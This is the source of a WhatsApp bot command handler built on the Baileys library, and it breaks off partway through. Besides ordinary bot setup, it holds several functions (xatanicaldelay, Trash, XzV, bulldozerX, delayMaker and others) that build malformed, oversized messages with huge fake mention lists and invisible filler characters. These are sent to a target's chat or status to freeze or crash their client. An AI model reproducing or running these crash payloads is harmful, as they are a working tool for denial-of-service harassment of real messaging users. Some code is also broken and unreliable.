// By Lord Shadow
require('../setting/config')
const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");
const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReriyuectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediariyuInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisriyuectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

// ===================== Module =====================
const { 
    spawn: 
    spawn, 
    exec 
} = require('child_process')
const fs = require('fs')
const pino = require('pino')
const util = require('util')
const chalk = require('chalk')
const { Boom } = require('@hapi/boom')
const os = require('os')
const NodeCache = require("node-cache");
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed()
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { ocrSpace } = require("ocr-space-api-wrapper")
const sharp = require("sharp")
module.exports = rich = async (rich, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Order one look]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Order one look]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Order one look]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Temporary order]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Interactive messaging]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Message has been deleted]" :

    ""
);

// ===================== Database ===========================
const owner = JSON.parse(fs.readFileSync('./function/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./function/premium.json'))
const bankDataPath = './bankData.json';
// Load bank data on startup
global.bankList = fs.existsSync(bankDataPath)
  ? JSON.parse(fs.readFileSync(bankDataPath))
  : {};

// Save function
function saveBankList() {
  fs.writeFileSync(bankDataPath, JSON.stringify(global.bankList, null, 2));
}
// ===================== Body dan Prefix =====================
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = global.prefa 
  ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(budy) 
    ? budy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] 
    : "" 
  : global.prefa ?? global.prefix

// ===================== Command Handling ==================
const isCmd = budy.startsWith(prefix)
const command = isCmd ? budy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = budy.trim().split(/ +/).slice(1)
const qtext = q = args.join(" ")
const text = m.message?.conversation || m.message?.extendedTextMessage?.text;
// ===================== User Info ===========================
const botNumber = await rich.decodeJid(rich.user.id)
const isCreator = [botNumber, ...owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

const isPremium = [botNumber, ...Premium]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

// ===================== Quoted Message =====================
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m

// ===================== Utility Functions =====================
const { 
    smsg,
    tanggal, 
    getTime, 
    isUrl, 
    sleep, 
    clockString, 
    runtime, 
    fetchJson, 
    getBuffer, 
    jsonformat, 
    format, 
    parseMention, 
    getRandom, 
    getGroupAdmins, 
    generateProfilePicture 
} = require('../function/storage')
const sendPollMenu = async (rich, jid) => {
  await rich.sendMessage(jid, {
    text: '📊 *Poll Menu*\n\nChoose one:',
    buttons: [
      { buttonId: 'poll_me', buttonText: { displayText: '🧠 Me' }, type: 1 },
      { buttonId: 'poll_button', buttonText: { displayText: '🔘 Button' }, type: 1 },
      { buttonId: 'poll_from', buttonText: { displayText: '📍 From' }, type: 1 },
    ],
    footer: 'Vote by tapping a button',
    headerType: 1
  });
};
// ===================== Group Info ==========================
const from = m.key.remoteJid;
const sender = m.isGroup 
  ? (m.key.participant ? m.key.participant : m.participant) 
  : m.key.remoteJid;


const groupMetadata = m.isGroup ? await rich.groupMetadata(from).catch(e => {}) : null;
const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
const groupAdmins = m.isGroup ? getGroupAdmins(participants) : [];
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : ''
// ===================== User Info Tambahan ==================
const pushname = m.pushName || "No Name"

// ===================== Waktu & Lokalisasi ==================
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
})

// ===================== MIME ==============================
const mime = (quoted.msg || quoted).mimetype || ''

// ===================== Exif & Media Converter ===============
const { 
    imageToWebp, 
    videoToWebp, 
    writeExifImg, 
    writeExifVid, 
    addExif 
} = require('../function/exif.js')

// ===================== Media Assets ========================
const imgCrL = fs.readFileSync("./start/media/CrL.jpg")
const image1 = fs.readFileSync("./start/media/image1.jpg")
const richieplay = fs.readFileSync("./start/media/rich.mp3")
// ===================== Access Control =====================
if (!rich.public) {
  if (!isCreator) return
}
   
// ===================== Console Logger =====================
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#5a2878').hex('#ffffff').bold(
      `📥 *New Message Log*\n` +
`━━━━━━━━━━━━━━━━━━━\n` +
`📅 *Date*       : ${todayDateWIB}\n` +
`🕐 *Time*       : ${time}\n` +
`💬 *Type*       : ${m.mtype}\n` +
`🏷️ *Group Name* : ${groupName || 'Private Chat'}\n` +
`🆔 *Chat ID*    : ${m.chat}\n` +
`🧑‍💬 *Sender*    : ${pushname}\n` +
`🤖 *Bot Number* : ${botNumber}\n` +
`━━━━━━━━━━━━━━━━━━━`

    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#78282d').hex('#ffffff').bold(
    `📥 *New Private Message*\n` +
`━━━━━━━━━━━━━━━━━━━━━━\n` +
`📅 *Date*        : ${todayDateWIB}\n` +
`🕐 *Time*        : ${time}\n` +
`💬 *Message Type*: ${m.mtype}\n` +
`🌐 *Group Name*  : Not in Group\n` +
`🔑 *Group ID*    : Not in Group\n` +
`🗣️ *Sender*      : ${pushname}\n` +
`👤 *Recipient*   : ${botNumber}\n` +
`━━━━━━━━━━━━━━━━━━━━━━`

    ));
  }
}

    // ============ OWNER ============== //
const creators = ["2348093017755", "2347014720371"]
    // ============ Consta ============= //
const messageCounts = new Map();
const lastActive = new Map();
const activePolls = new Map();
const antilinkGroups = new Set();

// Corrected admin check function
async function isAdmin(groupId, userId, sock) {
  try {
    // Verify all required parameters exist
    if (!groupId || !userId || !sock?.groupMetadata) {
      console.error('Missing parameters for admin check');
      return false;
    }

    // Get group metadata
    const metadata = await rich.groupMetadata(groupId).catch(() => null);
    if (!metadata?.participants) {
      console.error('Failed to fetch group metadata');
      return false;
    }

    // Find the participant
    const participant = metadata.participants.find(p => p.id === userId);
    
    // Return admin status (supports both 'admin' and 'superadmin' types)
    return participant?.admin === 'admin' || participant?.admin === 'superadmin';
  } catch (e) {
    console.error('Admin check error:', e);
    return false;
  }
}

    async function isGroupAdmin(groupId, userId, sock) {
    try {
        const metadata = await sock.groupMetadata(groupId);
        const participant = metadata.participants.find(p => p.id === userId);
        return participant?.admin === 'admin' || participant?.admin === 'superadmin';
    } catch (error) {
        console.error("Admin check error:", error);
        return false;
    }
}
 
    
  // ================== WELCOME AND GOODBYE =================//

// ================== Uptime ================//
            function formatUptime(seconds) {
            const days = Math.floor(seconds / (3600 * 24));
            const hours = Math.floor((seconds % (3600 * 24)) / 3600);
            const minutes = Math.floor((seconds % 3600) / 60);
            const secs = Math.floor(seconds % 60);
            
            return `${days}d ${hours}h ${minutes}m ${secs}s`;
        }

// ===================== Custom Reply =====================

const reply = m.reply


async function checkWhatsAppNumbers(rich, numbers) {
  try {
    if (!Array.isArray(numbers) || numbers.length === 0) {
      throw Boom.badRequest('Provide numbers as an array');
    }

    const results = await Promise.all(
      numbers.map(async (rawNum) => {
        const num = rawNum.replace(/\D/g, ''); // Remove non-digits
        if (num.length < 6) return null; // Skip invalid numbers

        const jid = `${num}@s.whatsapp.net`;
        try {
          const [user] = await sock.onWhatsApp(jid);
          return {
            number: num,
            formatted: num.replace(/(\d{1,3})(\d{3})(\d{3,})/, '$1 $2 $3'),
            exists: user?.exists || false,
            business: user?.isBusiness || false
          };
        } catch {
          return { 
            number: num,
            formatted: num.replace(/(\d{1,3})(\d{3})(\d{3,})/, '$1 $2 $3'),
            exists: false,
            business: false
          };
        }
      })
    );

    return results.filter(Boolean); // Remove null entries
  } catch (error) {
    console.error('WhatsApp check error:', error);
    throw Boom.boomify(error, { statusCode: 500 });
  }
}

// ===================== Emoji Reaction =====================

const reaction = async (isTarget, emoji) => {
    rich.sendMessage(isTarget, {
        react: {
            text: emoji,
            key: m.key 
        } 
    });
}

// ===================== Mention Helper =====================
rich.ments = async (text) => {
    return [m.chat];
}

// Newsletter Channels
const channelIds = [
  "120363399191935982@newsletter"
];

// Load previously followed channels
let followedChannels = new Set();
try {
  const data = fs.readFileSync('./followedChannels.json', 'utf8');
  followedChannels = new Set(JSON.parse(data));
} catch {
  console.log('No previous follow data found, starting fresh.');
}

// Newsletter follow function
function followNewsletter(channelIds) {
  try {
    const channelToFollow = channelIds[0];
    if (!followedChannels.has(channelToFollow)) {
      rich.newsletterFollow(channelToFollow); // Replace with your Baileys client
      followedChannels.add(channelToFollow);
      fs.writeFileSync('./followedChannels.json', JSON.stringify([...followedChannels]));
      console.log(`✅ Followed channel: ${channelToFollow}`);
    } else {
      console.log(`⚠️ Already followed channel: ${channelToFollow}`);
    }
  } catch (err) {
    console.error('❌ Newsletter follow error:', err);
  }
}
async function resize(image, width, height) {
  const img = await jimp.read(image)
  img.resize(width, height)
  return await img.getBufferAsync(jimp.MIME_JPEG)
}

      // ============ DELAY ============= //
  function randStr(len = 20) {
  return Math.random().toString(36).slice(2, 2 + len);
}

function invisibleFill(size = 50000) {
  return "\u2063".repeat(size);
}

async function xatanicaldelay(target, mention = false) {
  const bigMentions = Array.from({ length: 40000 }, () =>
    "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
  );

  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mimetype: "image/jpeg",
          caption: "Bellakuuu" + invisibleFill(40000),
          fileSha256: Buffer.from(randStr(64)),
          fileLength: "999999999",
          height: 9999,
          width: 9999,
          mediaKey: Buffer.from(randStr(32)),
          fileEncSha256: Buffer.from(randStr(64)),
          directPath: "/v/fakepath/" + randStr(50),
          mediaKeyTimestamp: Date.now(),
          jpegThumbnail: Buffer.from(randStr(2000)),
          scansSidecar: randStr(50),
          scanLengths: Array.from({ length: 50 }, () => 999999),
          contextInfo: {
            mentionedJid: bigMentions,
            stanzaId: randStr(30),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              conversation: invisibleFill(30000)
            },
            businessMessageForwardInfo: {
              businessOwnerJid: randStr(20) + "@s.whatsapp.net"
            }
          },
          // Nesting the same image again to double the decoding cost
          secondLayerImage: {
            mimetype: "image/jpeg",
            caption: invisibleFill(20000),
            fileLength: "888888888",
            mediaKey: Buffer.from(randStr(32))
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  // Broadcast to status and direct
  await rich.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await rich.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: { key: msg.key, type: 25 }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Oblivion" + invisibleFill(10000) },
            content: undefined
          }
        ]
      }
    );
  }
}

}

async function makluhomo(rich, target, mention = false) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: ".k",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "\n",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await rich.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await rich.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "ataa" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function Trash(target, mention = false) { 
    const delaymention = Array.from({ length: 50000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "rich",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363399191935982@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Oblivion"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await rich.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rich.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Oblivion" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function XzV(avx, target) {
const mentionedList = Array.from(
  { length: 40000 },
  () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`
);

    let msg;

    for (let i = 0; i < 100; i++) {
        const msgContent = {
            viewOnceMessage: {
                message: {
                    conversation: "\u2063".repeat(1000),
                    contextInfo: {
                        externalAdReply: {
                            title: "Memek Maklo asin",
                            body: "Alay Kontol",
                            thumbnailUrl: "https://files.catbox.moe/ks5pvg.jpg",
                            mediaType: 1,
                            sourceUrl: "https://t.me/AntaGremory",
                            showAdAttribution: false
                        },
                        mentionedJid: mentionedJids
                    },
                    interactiveResponseMessage: {
                        body: {
                            text: "",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "꧔꧈".repeat(9000),
                            version: 3
                        }
                    }
                }
            },
            nativeFlowMessage: {
                name: "call_permission_request",
                messageParamsJson: "{{[[((".repeat(5000) + "[".repeat(5000),
                status: true,
                cameraAccess: true
            }
        };

        msg = await generateWAMessageFromContent(target, msgContent, {});
        await new Promise(resolve => setTimeout(resolve, 300));
    }

    await rich.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await rich.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

    async function bulldozerX(target, mention = false) {
const generateMessage = {
    viewOnceMessage: {
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0,
            44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245,
            153, 93, 211,
          ]),
          fileLength: 432722,
          seconds: 20,
          ptt: false,
          mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
            117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
            145,
          ]),
          fileEncSha256: Buffer.from([
            29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84,
            131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211,
            83, 153,
          ]),
          directPath:
            "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1746275400,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

let Newdly = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
          },
          interactiveResponseMessage: {
            body: {
              text: "ꦽ馃И谭鈨搬彂汀蜏饾",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "phynx_agency",
             buttonParamsJson: JSON.stringify({ status: true }), 
              version: 3,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741,
              forwardedNewsletterMessageInfo: {
                newsletterName: "trigger newsletter ( @AnosReal6 )",
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
              },
            },
          },
        },
      },
    },
    {}
  );

    let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 100 * 400,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, message, Newdly, {});

  await rich.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
    if (mention) {
    await rich.relayMessage(
      target,
      {
        StatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "rich" },
            content: undefined,
          },
        ],
      }
    );
  }
}
   

    async function delayMaker(target, mention = false, delayMs = 400) {
  for (const targett of target) {
    const generateMessage = {
     viewOnceMessage: {
       message: {
         imageMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m232/AQMP8t4-5ZHQ2nk8fAsUgGYB9q-UTgb-mAIQWjNHknLZCQpzrkkuCXh-3tbqjIl8B2XweM63Sh5uoFv-pouKkoGw4z-MWgpHSsTAnUuTw?ccb=9-4&oh=01_Q5Aa1gF2bGk5pbx0dyuS7FH7gF7yv65XoTi_DZMzLNSMRZdPtA&oe=684B6ED1&_nc_sid=e6ed6c&mms3=true",
         mimetype: "image/jpeg",
         caption: "love killing the ram" + "\u200b".repeat(11111),
         fileSha256: "1VqMUklyU+UL/CyOtNmda9uTCYoE/jTW/YStC44ge28=",
         fileLength: { low: 629145600, high: 0, unsigned: true },
         height: 2810,
         width: 6213,
         mediaKey: "3fpHZJT66ITBU7AwbBT3c9x8wwwdvJVtAGYu3DSfE7s=",
         fileEncSha256: "WRkVr7oxZzAZ24sMLYfc/WzxOC8Y9Kjc8nJLWi3Dk1s=",
         directPath: "/o1/v/t62.7118-24/f2/m232/AQMOP8t-5ZHQ2nk8fAsUgGYB9q-UTgb-mAIQWjNHknLZCQpzrkkuCXh-3tbqjIl8B2XweM63Sh5uoFv-pouKkoGw4z-MWgpHSsTAnUuTw?ccb=9-4&oh=01_Q5Aa1gF2bGk5pbx0dyuS7FH7gF7yv65XoTi_DZMzLNSMRZdPtA&oe=684B6ED1&_nc_sid=e6ed6c",
         mediaKeyTimestamp: "1743225419",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2MBERISGBUYLxoaL2NCOEJjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY//AABEIACIAIAMBEQACEQEDEQH/xAGiAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgsQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+gEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoLEQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/AOEt4HnfauB2yxwB+PQVMpKKJlKxrXlkkcTRwRMI9nmE+WC6sFGQT1xk4J4G4NxxiueFTmev9f1+VtTJTu9SzbWUF1YIRbL5hiJKgENK4DHgnJI4XITH3u2MVnKcoT30v9y0/wCDv2IcnGVr6f1/WpjajYvZXUsZXKI+0MG3AdcDOBzwfToa6qVRVIpm8J8yub2lqlrpKymPfEwyWliLxNk4ORg8hhg8rwqnB6Vx1ffqW/J2f6dNtH123MJ+9OwaQbTU7u5e/kSK2tgAkTSYGCcZLZz2UfkOgAoxDqUopU1q+tgq80EuXdk2tR